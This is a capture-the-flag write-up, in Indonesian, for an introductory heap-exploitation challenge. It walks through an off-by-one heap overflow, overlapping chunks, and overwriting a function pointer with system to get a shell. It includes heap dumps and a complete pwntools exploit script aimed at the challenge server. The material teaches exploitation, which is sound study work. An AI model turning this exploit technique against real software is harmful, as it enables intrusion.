# Coloring (0 solves)

Challenge ini merupakan pengenalan dari heap exploitation. Seperti chall-chall pwn saya yang lain, diberikan source code dari program yang akan dieksploitasi sehingga kita tidak perlu kesulitan untuk memahami apa yang program ini lakukan dan bisa fokus di pencarian vulnerability dan eksploitasi.

Singkat cerita, vulnerability di program ini terdapat pada saat melakukan create text, tepatnya pada size yang dialokasikan.
```c
    texts[index] = malloc(sizeof(color_text) + size - 1);
```
> Jika anda penasaran kenapa ditambah `sizeof(color_text)`, silahkan baca mengenai [Flexible Array Member](https://en.wikipedia.org/wiki/Flexible_array_member)

Terlihat bahwa size yang dialokasikan dikurangi 1 byte. Hal ini merupakan sebuah bug karena selanjutnya program akan meminta user untuk mengisi buffer dengan string berukuran `size`
```c
    printf("Text: ");
    int n = read(STDIN_FILENO, texts[index]->text, size);
```
Konsekuensinya, terdapat buffer overflow sebesar 1 byte.

Lalu apa yang akan terjadi?

Ayo kita coba alokasikan 2 buah text berukuran 20 dan lihat seperti apa strukturnya di dalam heap arena

```
0x405000|+0x00000|+0x00000: 0x0000000000000000 0x0000000000000291 | ................ | 
0x405010|+0x00010|+0x00010: 0x0000000000000000 0x0000000000000000 | ................ | 
* 39 lines, 0x270 bytes
0x405290|+0x00000|+0x00290: 0x0000000000000000 0x0000000000000031 | ........1....... | 
0x4052a0|+0x00010|+0x002a0: 0x00000000004011c6 0x0000312054584554 | ..@.....TEXT 1.. | 
0x4052b0|+0x00020|+0x002b0: 0x0000000000000000 0x0000000000000000 | ................ | 
0x4052c0|+0x00000|+0x002c0: 0x0000000000000000 0x0000000000000031 | ........1....... | 
0x4052d0|+0x00010|+0x002d0: 0x00000000004011c6 0x0000322054584554 | ..@.....TEXT 2.. | 
0x4052e0|+0x00020|+0x002e0: 0x0000000000000000 0x0000000000000000 | ................ | 
0x4052f0|+0x00000|+0x002f0: 0x0000000000000000 0x0000000000020d11 | ................ |  <-  top
0x405300|+0x00010|+0x00300: 0x0000000000000000 0x0000000000000000 | ................ | 
* 8399 lines, 0x20cf0 bytes
```
Kedua text yang kita buat disimpan di dalam dua buah chunk yang berdampingan, yaitu
```
                                               0x0000000000000031 | ........1....... | 
0x4052a0|+0x00010|+0x002a0: 0x00000000004011c6 0x0000312054584554 | ..@.....TEXT 1.. | 
0x4052b0|+0x00020|+0x002b0: 0x0000000000000000 0x0000000000000000 | ................ | 
0x4052c0|+0x00000|+0x002c0: 0x0000000000000000
```
dan 
```
                                               0x0000000000000031 | ........1....... | 
0x4052d0|+0x00010|+0x002d0: 0x00000000004011c6 0x0000322054584554 | ..@.....TEXT 2.. | 
0x4052e0|+0x00020|+0x002e0: 0x0000000000000000 0x0000000000000000 | ................ | 
0x4052f0|+0x00000|+0x002f0: 0x0000000000000000
```
`0x0000000000000031` merupakan size dari chunk, `0x00000000004011ef` adalah value dari field color_printer, dan data selanjutnya adalah text yang kita input.

Perhatikan bahwa terdapat size dari chunk tepat setelah text buffer. Ini artinya, kita bisa memanfaatkan buffer overfow sebesar 1 byte tersebut untuk mengoverwrite size dari chunk sebelahnya. Namun, untuk melakukan ini kita harus memilih size yang tepat, yaitu memenuhi syarat total_size >= 0x18 dan total_size & 0xf == 8, dengan total_size = sizeof(color_text) + size - 1. Karena sizeof(color_text) = 8, maka total_size = size + 7. Salah satu size yang memenuhi adalah 17, yang berarti total_size = 24 = 0x18.

Ayo kita coba alokasikan 2 buah text lagi berukuran 17, tetapi isi text kedua sampai penuh (17 karakter)

```
0x405000|+0x00000|+0x00000: 0x0000000000000000 0x0000000000000291 | ................ |                 
0x405010|+0x00010|+0x00010: 0x0000000000000000 0x0000000000000000 | ................ | 
* 39 lines, 0x270 bytes
0x405290|+0x00000|+0x00290: 0x0000000000000000 0x0000000000000021 | ........!....... | 
0x4052a0|+0x00010|+0x002a0: 0x00000000004011c6 0x0000312054584554 | ..@.....TEXT 1.. | 
0x4052b0|+0x00000|+0x002b0: 0x0000000000000000 0x0000000000000021 | ........!....... | 
0x4052c0|+0x00010|+0x002c0: 0x00000000004011c6 0x4141414141414141 | ..@.....AAAAAAAA | 
[!] Corrupted (addr + chunk.size > sect.page_end)
0x4052d0|+0x00000|+0x002d0: 0x4141414141414141 0x0000000000020d41 | AAAAAAAAA....... |  <-  top
```
Terlihat bahwa terdapat kerusakan pada top chunk karena 1 byte dari field size-nya teroverwrite dengan 'A'. Terbukti bahwa kita bisa mengoverwrite size dari next chunk.

Hal yang bisa kita lakukan dengan hal tersebut yaitu membuat sebuah situasi dimana tedapat 2 chunk yang saling beririsan sehingga kita bisa mengoverwrite data dari salah satu chunk. Untuk mencapai situasi tersebut, perhatikan struktur heap setelah membuat 3 buah text.
```
0x405000|+0x00000|+0x00000: 0x0000000000000000 0x0000000000000291 | ................ | 
0x405010|+0x00010|+0x00010: 0x0000000000000000 0x0000000000000000 | ................ | 
* 39 lines, 0x270 bytes
0x405290|+0x00000|+0x00290: 0x0000000000000000 0x0000000000000021 | ........!....... | 
0x4052a0|+0x00010|+0x002a0: 0x00000000004011c6 0x0000312054584554 | ..@.....TEXT 1.. | 
0x4052b0|+0x00000|+0x002b0: 0x0000000000000000 0x0000000000000021 | ........!....... | 
0x4052c0|+0x00010|+0x002c0: 0x00000000004011c6 0x0000322054584554 | ..@.....TEXT 2.. | 
0x4052d0|+0x00000|+0x002d0: 0x0000000000000000 0x0000000000000021 | ........!....... | 
0x4052e0|+0x00010|+0x002e0: 0x00000000004011c6 0x0000332054584554 | ..@.....TEXT 3.. | 
0x4052f0|+0x00000|+0x002f0: 0x0000000000000000 0x0000000000020d11 | ................ |  <-  top
0x405300|+0x00010|+0x00300: 0x0000000000000000 0x0000000000000000 | ................ | 
* 8399 lines, 0x20cf0 bytes
```
Jika kita mengoverwrite size dari chunk kedua menjadi 0x41, maka kita bisa membuat chunk 2 dan chunk 3 menjadi saling beririsan. Alhasil kita bisa mengoverwrite data yang terdapat pada chunk 3. Target yang akan kita overwrite adalah field color_printer yang merupakan sebuah function pointer yang akan dipanggil di dalam fungsi print_text. Kita akan mengoverwrite-nya menjadi fungsi system, sehingga jika kita memiliki text "/bin/sh", maka system("/bin/sh") akan terpanggil ketika kita ingin melakukan print text tersebut.

Full solver:
```python
#!/usr/bin/env python3

import ctypes

from pwn import *

context.terminal = "kitty @launch --location=split --cwd=current".split()


def start(argv=[], *a, **kw):
    if args.LOCAL:
        argv = argv if argv else [exe.path]
        if args.GDB:
            return gdb.debug(argv, gdbscript=gdbscript, *a, **kw)
        return process(argv, *a, **kw)
    return remote(args.HOST or host, args.PORT or port, *a, **kw)


def safe_flat(*args, unsafe_chars=b"\n", **kwargs):
    p = flat(args, **kwargs)
    if any(c in unsafe_chars for c in p):
        raise ValueError("unsafe:", p)
    return p


def create_text(index, size, color, text):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b"(1-16): ", str(index).encode())
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendlineafter(b"Color: ", str(color).encode())
    io.sendafter(b"Text: ", text)


def print_text(index):
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b"(1-16): ", str(index).encode())


def delete_text(index):
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b"(1-16): ", str(index).encode())


gdbscript = """
c
"""
host, port = args.HOST or "108.137.70.166", args.PORT or 16000
exe = context.binary = ELF(args.EXE or "../src/chall", False)

io = start()

create_text(1, 17, 1, b"overflow me\n")
create_text(2, 17, 1, b"size\n")
create_text(3, 17, 1, b"printer\n")

delete_text(1)

create_text(1, 17, 1, safe_flat({16: b"\x41"}))

delete_text(2)

create_text(2, 49, 1, safe_flat({16: [0x21, exe.sym["system"], b"/bin/sh\0"]}))

print_text(3)

io.interactive()

```

> Urutan operasi yang dilakukan sangat penting. Silahkan anda debug sendiri untuk mencari tahu kenapa saya memilih urutan operasi seperti di atas
